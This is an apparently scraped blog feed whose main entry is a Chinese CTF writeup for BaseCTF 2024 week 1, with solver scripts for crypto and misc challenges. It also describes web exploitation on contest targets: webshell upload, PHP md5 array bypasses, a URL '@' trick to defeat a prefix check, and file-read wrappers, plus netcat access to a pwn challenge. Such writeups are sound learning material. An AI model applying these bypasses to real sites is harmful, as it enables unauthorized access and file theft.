    <summary type="html">&lt;h2 id=&quot;一脚踹开src的大门&quot;&gt;&lt;a href=&quot;#一脚踹开src的大门&quot; class=&quot;headerlink&quot; title=&quot;一脚踹开src的大门&quot;&gt;&lt;/a&gt;一脚踹开src的大门&lt;/h2&gt;&lt;p&gt;嘛 机缘巧合下开始练习src 总之先拿vulhub练练手&lt;br&gt;注释: 本来用的是docker纯本地搭建 效率太鸡肋了 换成在线网站搞flag的形式吧 没法getshell的会在这里继续更新&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="src" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/src/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="src" scheme="https://www.maonie.top/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>神奇脚本在哪里-CTF之Pwn</title>
    <link href="https://www.maonie.top/2024/08/26/%E7%A5%9E%E5%A5%87%E8%84%9A%E6%9C%AC%E5%9C%A8%E5%93%AA%E9%87%8C-CTF%E4%B9%8BPwn/"/>
    <id>https://www.maonie.top/2024/08/26/%E7%A5%9E%E5%A5%87%E8%84%9A%E6%9C%AC%E5%9C%A8%E5%93%AA%E9%87%8C-CTF%E4%B9%8BPwn/</id>
    <published>2024-08-25T19:52:17.000Z</published>
    <updated>2024-09-08T11:46:38.656Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>ps:最近刚开学 很忙 会很慢的更</p><h2 id="最近接触到了Pwn-那就来顺带讲讲Pwn吧"><a href="#最近接触到了Pwn-那就来顺带讲讲Pwn吧" class="headerlink" title="最近接触到了Pwn 那就来顺带讲讲Pwn吧"></a>最近接触到了Pwn 那就来顺带讲讲Pwn吧</h2><p>基于我对pwn的理解 pwn的过程分别为下:<br>1.题目在大部分情况下会提供一个文件和相应环境<br>2.所提供文件的内容对应了环境所指向的靶机 该靶机所运行的便是该文件<br>3.尝试通过nc 或python的pwn脚本来爆破出flag内容</p><span id="more"></span><h2 id="（在做了的）例题"><a href="#（在做了的）例题" class="headerlink" title="（在做了的）例题"></a>（在做了的）例题</h2><h2 id="BUUCTF-test-your-nc"><a href="#BUUCTF-test-your-nc" class="headerlink" title="[BUUCTF]test-your-nc"></a>[BUUCTF]test-your-nc</h2><p>这个题目标题就已经揭示了大部分的主要内容-用nc链接靶机i/p获取flag</p><p><img data-src="/2024/08/26/%E7%A5%9E%E5%A5%87%E8%84%9A%E6%9C%AC%E5%9C%A8%E5%93%AA%E9%87%8C-CTF%E4%B9%8BPwn/1.jpg" alt="1"></p><p><img data-src="/2024/08/26/%E7%A5%9E%E5%A5%87%E8%84%9A%E6%9C%AC%E5%9C%A8%E5%93%AA%E9%87%8C-CTF%E4%B9%8BPwn/2.jpg" alt="2"></p><h2 id="后面的等我持续更新中（逃"><a href="#后面的等我持续更新中（逃" class="headerlink" title="后面的等我持续更新中（逃"></a>后面的等我持续更新中（逃</h2><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h2><hr><blockquote><p>We are just another visitor in a transient world.</p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;ps:最近刚开学 很忙 会很慢的更&lt;/p&gt;
&lt;h2 id=&quot;最近接触到了Pwn-那就来顺带讲讲Pwn吧&quot;&gt;&lt;a href=&quot;#最近接触到了Pwn-那就来顺带讲讲Pwn吧&quot; class=&quot;headerlink&quot; title=&quot;最近接触到了Pwn 那就来顺带讲讲Pwn吧&quot;&gt;&lt;/a&gt;最近接触到了Pwn 那就来顺带讲讲Pwn吧&lt;/h2&gt;&lt;p&gt;基于我对pwn的理解 pwn的过程分别为下:&lt;br&gt;1.题目在大部分情况下会提供一个文件和相应环境&lt;br&gt;2.所提供文件的内容对应了环境所指向的靶机 该靶机所运行的便是该文件&lt;br&gt;3.尝试通过nc 或python的pwn脚本来爆破出flag内容&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>BaseCTF高校联合新生赛2024</title>
    <link href="https://www.maonie.top/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/"/>
    <id>https://www.maonie.top/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/</id>
    <published>2024-08-15T23:12:08.000Z</published>
    <updated>2024-08-30T20:05:25.226Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>已经收到Kengwang的礼物啦<br><del>鉴于某些不可明说的原因 第二周开始就放官方writeup 并作为自主练习 不主动参赛了</del><br>目前更新到了第一周的writeup</p><span id="more"></span><h1 id="第一周-我们的writeup"><a href="#第一周-我们的writeup" class="headerlink" title="第一周-我们的writeup"></a>第一周-我们的writeup</h1><p><strong>这里是队伍0penness在BaseCTF 高校联合新生赛中对于题目的相关解答&amp;writeup</strong><br>爱来自<a href="https://www.maonie.top/">猫涅</a>&amp;<a href="https://truthleader.github.io/">真理教教主</a></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Week1-你也喜欢圣物吗"><a href="#Week1-你也喜欢圣物吗" class="headerlink" title="[Week1] 你也喜欢圣物吗"></a>[Week1] 你也喜欢圣物吗</h2><p><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/2.jpg" alt="2"><br>解压之后得到了一张图和压缩包<br>压缩包有密码保护 那么密码铁定就在这张图里边<br>放入stegsolve 解析图片<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/3.jpg" alt="3">一眼base加密 拿去解码<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/4.jpg" alt="4"><br>结果是个小提示 说明该图片经过了LSB加密<br>解密后翻到最上边确实有隐藏信息<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/5.jpg" alt="5"><br>用这段key打开压缩包<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/6.jpg" alt="6"><br>里面照样藏了个加密的压缩包 密码爆破也没用处 直接提示错误<br>根据压缩包的名称我们可以猜测这是一个伪加密zip<br>将他放进010editor 更改他的属性 解除伪加密<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/1.png" alt="1"><br>然后解压就是了 是个txt 还是一眼base加密<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/7.jpg" alt="7"><br>这是初步的结果 把前面的干扰项flag删除 继续解密<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/8.jpg" alt="8"><br>flag get<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/9.jpg" alt="9"></p><h2 id="Week1-根本进不去啊"><a href="#Week1-根本进不去啊" class="headerlink" title="[Week1] 根本进不去啊!"></a>[Week1] 根本进不去啊!</h2><p>网站进不去怎么办涅<br>nslookup一下网站dns记录吧<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/19.jpg" alt="19"><br>结束了</p><h2 id="Week1-海上遇到了鲨鱼"><a href="#Week1-海上遇到了鲨鱼" class="headerlink" title="[Week1] 海上遇到了鲨鱼"></a>[Week1] 海上遇到了鲨鱼</h2><p>wireshark解包题 总之ctrl+f 字符串 flag<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/16.jpg" alt="16"><br>有一个flag.jpg 和 flag.php 都追踪tcp流之后发现藏在php的里边<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/17.jpg" alt="17"><br>flag字段明显是反转过的 去找网站转回来<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/18.jpg" alt="18"><br>完事</p><h2 id="Week1-正着看还是反着看呢？"><a href="#Week1-正着看还是反着看呢？" class="headerlink" title="[Week1] 正着看还是反着看呢？"></a><strong>[Week1] 正着看还是反着看呢？</strong></h2><p>把文件放进了ida pro 没什么好注意的点 除了hex编码下有一些倒转的flag.txt<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/22.jpg" alt="22"><br>难道是要将整个文件的某种编码进行反转？<br>这里就搜到一个正好能用的小工具<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/23.jpg" alt="23"><br>放进去转了一下 出来个inversion.bin<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/24.jpg" alt="24"><br>表面是张jpg 但hex码中有flag.txt的字眼 经过判断 这是个经过binwalk组合的文件<br>进自带binwalk的kali 把他拆成两半 获得flag<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/25.jpg" alt="25"></p><h2 id="Week1-Base"><a href="#Week1-Base" class="headerlink" title="[Week1] Base"></a>[Week1] Base</h2><p>打开一看 一眼base加密</p><p><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/20.jpg" alt="20"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/21.jpg" alt="21"><br>获取</p><h2 id="Week1-人生苦短，我用Python"><a href="#Week1-人生苦短，我用Python" class="headerlink" title="[Week1] 人生苦短，我用Python"></a>[Week1] 人生苦短，我用Python</h2><p>总之就是一个条件一个条件的掰flag<br>最后better个be部分没提示了,但是有hash爆破<br>BaseCTF{s1Mpl3_1s_??Tt3r_Th4n_C0mPl3x}<br>我不记得是猜Be还是用下面的exp爆的,这题做的我昏过去了</p><pre class="line-numbers language-none"><code class="language-none">import hashlib  import itertools    # 给定的flag模板和哈希值  flag_template = 'BaseCTF{s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}'  target_hash = 'e40075055f34f88993f47efb3429bd0e44a7f479'    # 可能的字符集（这里假设是小写字母和数字）  charset = 'QAZWSXEDCRFVTGBYHNUJMIKLOPabcdefghijklmnopqrstuvwxyz0123456789'    # 遍历所有可能的两个字符组合  for chars in itertools.product(charset, charset):      # 生成当前尝试的flag      current_flag = flag_template.replace('??', ''.join(chars))      # 计算当前flag的SHA-1哈希值      current_hash = hashlib.sha1(current_flag.encode()).hexdigest()      # 检查哈希值是否匹配      print(current_hash)    if current_hash == target_hash:          print(f"找到匹配的flag: {current_flag}")          break  # 找到匹配项后退出循环  else:      print("没有找到匹配的flag")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-捂住X只耳"><a href="#Week1-捂住X只耳" class="headerlink" title="[Week1] 捂住X只耳"></a>[Week1] 捂住X只耳</h2><p>给了段音乐 提示为“屏蔽立体音，发现隐藏的东西”<br>我是在用potplayer尝试用不同音轨输出时发现的<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/10.jpg" alt="10"><br>将中置声音完全屏蔽 增大其他轨道的音量 仔细听会有五段规律相同的摩斯密码<br>那时候有点太兴奋了忘了记录过程 总之录屏下来放进了pr 用音轨可视化得出了摩斯密码<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/11.png" alt="11"></p><p><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/12.jpg" alt="12"></p><h2 id="Week1-倒计时？海报！（包括公开版和公开前）"><a href="#Week1-倒计时？海报！（包括公开版和公开前）" class="headerlink" title="[Week1] 倒计时？海报！（包括公开版和公开前）"></a>[Week1] 倒计时？海报！（包括公开版和公开前）</h2><p>群相册里有十张倒计时的图片 每一张都藏着一部分flag<br>鉴于已经公开了flag 我这里列出部分过程截图<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/13.jpg" alt="13"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/14.jpg" alt="14"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/15.jpg" alt="15"></p><h2 id="Week1-签到！DK-盾！"><a href="#Week1-签到！DK-盾！" class="headerlink" title="[Week1] 签到！DK 盾！"></a><strong>[Week1] 签到！DK 盾！</strong></h2><p>这个就没啥好说的了</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Week1-ez-rsa"><a href="#Week1-ez-rsa" class="headerlink" title="[Week1] ez_rsa"></a>[Week1] ez_rsa</h2><p>题目给了n e c 还有not_phi=(p+2)<em>(q+2)=p<code>*</code>q+2p+2q+4<br>要算出私钥d就要算出n的欧拉函数<br>n的欧拉函数是(p-1)</em>(q-1)=p<code>*</code>q-p-q+1</p><p>n = p<code>*</code>q<br>所以这是初中生就能解决的因式问题</p><p>n的欧拉函数 = (not_phi-n-4)//2</p><p>得到欧拉函数就可以用模逆元算d</p><p>有c d n就有明文</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">import libnumfrom sympy import mod_inverse  e=65537c=37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945not_phi = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205n = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421pplusq=(not_phi-n-4)//2phi=n+1-pplusqd = mod_inverse(e, phi)m=pow(c,d,n)print(libnum.n2s(m))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-babypack"><a href="#Week1-babypack" class="headerlink" title="[Week1] babypack"></a>[Week1] babypack</h2><p>加密脚本的过程大概是</p><ol><li>把flag转换为2进制</li><li>创建一个随机数列表a,可以观察到每个随机数必然是后一个的两倍多一点</li><li>然后看flag的2进制中的每一位是不是1,如果是则将随机数列表里对应数加到变量c上</li></ol><p>我们有的是a和c<br>那么就可以让a[i]和c比大小,判断第i+1位是不是1</p><p>总之exp如下</p><pre class="line-numbers language-none"><code class="language-none"># a = ···# c = ···for i in a:    if c&gt;i:        c-=i        print(1,end='')    else:        print(0,end='')    flag=0b10000100110000101110011011001010100001101010100010001100111101100110010011000110011010001100010001100000110001100110001001101010010110100110011011000100110010101100101001011010011010001100101001101000110000100101101011000100110010100110110011001010010110100110000011001100011001000110001011001010011010000110100011000100110010000110100011000110011100101111100print(libnum.n2s(flag))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-babyrsa"><a href="#Week1-babyrsa" class="headerlink" title="[Week1] babyrsa"></a>[Week1] babyrsa</h2><p>rsa算法,但是没有p和q,直接取n<br>我猜n大概率是素数,所以直接算它的欧拉函数</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">import libnumfrom sympy import mod_inverse  n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323e = 65537c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832phi = n-1d = mod_inverse(e, phi)m = pow(c,d,n)print(libnum.n2s(m))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-十七倍"><a href="#Week1-十七倍" class="headerlink" title="[Week1] 十七倍"></a><strong>[Week1] 十七倍</strong></h2><p>明文m转秘文c的算式为<br>m*17%256=c</p><p>那么 m=c*17关于256的模逆元%256<br>可以很容易的知道是241</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">cipher = [         98, 113, 163, 181, 115, 148, 166,  43,   9,  95,        165, 146,  79, 115, 146, 233, 112, 180,  48,  79,         65, 181, 113, 146,  46, 249,  78, 183,  79, 133,        180, 113, 146, 148, 163,  79,  78,  48, 231,  77] for int in cipher:    print(chr(int),end='')    print()for i in range(len(cipher)):    cipher[i] = (cipher[i]*241) % 256for int in cipher:    print(chr(int),end='')  # 或者，如果你不想使用预定义的逆元  # x = solve_modular_equation(y, multiplier=17, modulus=256)  # print(f"x = {x}")  # 同样应该输出 x = 148<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-helloCrypto"><a href="#Week1-helloCrypto" class="headerlink" title="[Week1] helloCrypto"></a><strong>[Week1] helloCrypto</strong></h2><p>很简单的一道<br>aes是对称加密,即然key给了就能直接解</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">from Crypto.Util.number import *from Crypto.Cipher import AESfrom Crypto.Util.Padding import padimport randomimport libnumkey = libnum.n2s(208797759953288399620324890930572736628)my_aes=AES.new(key=key,mode=AES.MODE_ECB)c = b'U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe{\xae'decrypted_padded = my_aes.decrypt(c)  print(decrypted_padded)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-你会算md5吗"><a href="#Week1-你会算md5吗" class="headerlink" title="[Week1] 你会算md5吗"></a><strong>[Week1] 你会算md5吗</strong></h2><p>题目的加密过程,是将flag里的每一个字符都单独拎出来算一遍md5<br>那么只要把ascii表上的字符都算一遍做成字典,然后和密文撞就行了</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">import hashlib  import string    def build_md5_dict():      md5_dict = {}      characters = string.ascii_letters + string.digits + string.punctuation      for char in characters:          md5_hash = hashlib.md5(char.encode()).hexdigest()          md5_dict[md5_hash] = char      return md5_dict    # 构建并打印MD5字典（注意：这里只打印了一部分以节省空间）  md5_dict = build_md5_dict()    # 注意：由于MD5的哈希冲突可能性极低（但不为0），我们假设在这个小字符集中没有冲突。def recover_string_from_md5_list(md5_list, md5_dict):      recovered_string = ""      for md5_hash in md5_list:          if md5_hash in md5_dict:              recovered_string += md5_dict[md5_hash]          else:              # 如果MD5列表中包含未知的MD5值，可以选择跳过或抛出异常              recovered_string += "?"      return recovered_string    # 示例MD5列表  md5_list = ['9d5ed678fe57bcca610140957afab571', '0cc175b9c0f1b6a831c399e269772661', '03c7c0ace395d80182db07ae2c30f034', 'e1671797c52e15f763380b45e841ec32', '0d61f8370cad1d412f80b84d143e1257', 'b9ece18c950afbfa6b0fdbfa4ff731d3', '800618943025315f869e4e1f09471012', 'f95b70fdc3088560732a5ac135644506', '0cc175b9c0f1b6a831c399e269772661', 'a87ff679a2f3e71d9181a67b7542122c', '92eb5ffee6ae2fec3ad71c777531578f', '8fa14cdd754f91cc6554c9e71929cce7', 'a87ff679a2f3e71d9181a67b7542122c', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '0cc175b9c0f1b6a831c399e269772661', 'e4da3b7fbbce2345d7772b0674a318d5', '336d5ebc5436534e61d16e63ddfca327', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '8fa14cdd754f91cc6554c9e71929cce7', '8fa14cdd754f91cc6554c9e71929cce7', '45c48cce2e2d7fbdea1afc51c7c6ad26', '336d5ebc5436534e61d16e63ddfca327', 'a87ff679a2f3e71d9181a67b7542122c', '8f14e45fceea167a5a36dedd4bea2543', '1679091c5a880faf6fb5e6087eb1b2dc', 'a87ff679a2f3e71d9181a67b7542122c', '336d5ebc5436534e61d16e63ddfca327', '92eb5ffee6ae2fec3ad71c777531578f', '8277e0910d750195b448797616e091ad', '0cc175b9c0f1b6a831c399e269772661', 'c81e728d9d4c2f636f067f89cc14862c', '336d5ebc5436534e61d16e63ddfca327', '0cc175b9c0f1b6a831c399e269772661', '8fa14cdd754f91cc6554c9e71929cce7', 'c9f0f895fb98ab9159f51fd0297e236d', 'e1671797c52e15f763380b45e841ec32', 'e1671797c52e15f763380b45e841ec32', 'a87ff679a2f3e71d9181a67b7542122c', '8277e0910d750195b448797616e091ad', '92eb5ffee6ae2fec3ad71c777531578f', '45c48cce2e2d7fbdea1afc51c7c6ad26', '0cc175b9c0f1b6a831c399e269772661', 'c9f0f895fb98ab9159f51fd0297e236d', '0cc175b9c0f1b6a831c399e269772661', 'cbb184dd8e05c9709e5dcaedaa0495cf']  # 使用步骤1中生成的md5_dict来恢复字符串  recovered_string = recover_string_from_md5_list(md5_list, md5_dict)  print(recovered_string)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a><strong>[Week1] HTTP 是什么呀</strong></h2><p>满足题目所有要求<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_1_1.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_1_2.png" alt="text"> </p><p>就能在网络包里发现flag<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_1_3.png" alt="text"> </p><h2 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•`"></a>[Week1] 喵喵喵´•ﻌ•`</h2><p>easy<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_2.png" alt="alt text"></p><h2 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h2><p>md5函数不能接受数组<br>会返回false<br>弱比较和强比较都能绕<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_3.png" alt="alt text"></p><h2 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a><strong>[Week1] A Dark Room</strong></h2><p>我也玩过<br>flag在注释里<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_4.png" alt="alt text"></p><h2 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h2><p>直接传马上去就行了<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_5_1.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_5_2.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_5_3.png" alt="text"></p><h2 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h2><p>pen检查用伪协议data%3A%2F%2Ftext%2Fplain%3Bbase64%2CQXVyYQ%3D%3D过<br>challenge难点</p><ol><li>需要以<a href="http://jasmineaura.github.io开头/">http://jasmineaura.github.io开头</a></li><li>需要让访问到的内容包含已经收到Kengwang的礼物啦</li></ol><p>而这个网页指向的博客,在题目开始的时候,有一篇文章却是包含了已经收到Kengwang的礼物啦<br>但后来被删了,我没来得及蹭到<br>所以通过url的奇妙结构<br><a href="http://jasmineaura.github.io@truthleader.github.io/">http://jasmineaura.github.io@truthleader.github.io</a></p><p>@后面的才会被当作域名解析<br>然后用gift直接包含得不到flag,所以用任意文件读取的伪协议<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_6_1.png" alt="alt text"> </p><p>base64解密<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_6_2.png" alt="alt text"></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Week1-签个到吧"><a href="#Week1-签个到吧" class="headerlink" title="[Week1] 签个到吧"></a><strong>[Week1] 签个到吧</strong></h2><p>nc challenge.basectf.fun 32200<br>cat /flag直接有</p><p><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_qiandao.png"></p><h2 id="Week1-echo"><a href="#Week1-echo" class="headerlink" title="[Week1] echo"></a><strong>[Week1] echo</strong></h2><p>用echo打印flag<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_echo.png"></p><h2 id="Week1-Ret2text"><a href="#Week1-Ret2text" class="headerlink" title="[Week1] Ret2text"></a><strong>[Week1] Ret2text</strong></h2><p>可以看到shell的地址<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_ret2text1.png" alt="alt 